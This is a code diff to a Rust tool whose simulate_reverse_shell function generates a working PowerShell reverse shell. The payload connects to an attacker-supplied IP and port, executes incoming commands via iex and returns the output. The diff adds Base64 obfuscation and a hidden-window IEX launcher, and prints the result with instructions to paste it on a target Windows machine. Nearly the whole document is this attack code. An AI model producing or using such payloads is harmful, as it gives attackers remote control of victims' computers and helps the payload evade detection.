@@ -1,12 +1,22 @@
-use std::process::Command;
 use std::io::{self, Write};
 use std::net::IpAddr;
+use base64;
+
+/// Obfuscates the payload with Base64 encoding
+fn obfuscate_payload(payload: &str) -> String {
+    base64::encode(payload)
+}
+
+/// Generates a deobfuscation PowerShell script
+fn generate_powershell_command(encoded_payload: &str) -> String {
+    format!(
+        "powershell.exe -NoProfile -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{}')) | IEX\"",
+        encoded_payload
+    )
+}
 
 pub fn simulate_reverse_shell() {
-    println!("Simulating reverse shell attack...");
-
-    // Generate the PowerShell payload
-    println!("Generating PowerShell reverse shell payload...");
+    println!("Generating obfuscated reverse shell payload...");
 
     // Prompt for IP address
     print!("Enter the IP address to connect back to: ");
@@ -36,35 +46,19 @@ pub fn simulate_reverse_shell() {
         }
     };
 
-    // Generate the PowerShell reverse shell command
-    let ps_command = format!(
-        "$callback = New-Object System.Net.Sockets.TCPClient(\"{}\",{});$stream = $callback.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$callback.Close()",
+    // Generate the PowerShell reverse shell payload
+    let ps_payload = format!(
+        "$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$buffer = 0..65535 | %{{0}};while (($bytes = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {{;$data = ([System.Text.Encoding]::ASCII).GetString($buffer,0,$bytes);$response = (iex $data 2>&1 | Out-String);$response += 'PS ' + (pwd).Path + '> ';$stream.Write(([System.Text.Encoding]::ASCII).GetBytes($response), 0, $response.Length);$stream.Flush();}}",
         ip, port
     );
 
-    // Determine PowerShell binary based on OS
-    let shell_binary = if cfg!(target_os = "windows") {
-        "powershell"
-    } else {
-        "pwsh"
-    };
+    // Obfuscate the payload
+    let obfuscated_payload = obfuscate_payload(&ps_payload);
 
-    // Encode the command using PowerShell
-    let encoded_command = Command::new(shell_binary)
-        .arg("-Command")
-        .arg(format!(
-            "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('{}'))",
-            ps_command
-        ))
-        .output()
-        .expect("Failed to encode the command in Base64");
+    // Generate the PowerShell execution command
+    let ps_command = generate_powershell_command(&obfuscated_payload);
 
-    let encoded_command = String::from_utf8_lossy(&encoded_command.stdout).trim().to_string();
-
-    // Print the PowerShell execution command
-    println!("\nCopy and paste the following command into PowerShell on the target machine:");
-    println!(
-        "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {}",
-        encoded_command
-    );
+    // Output the command for manual execution
+    println!("\nCopy and paste the following PowerShell command into the target Windows machine:");
+    println!("{}", ps_command);
 }
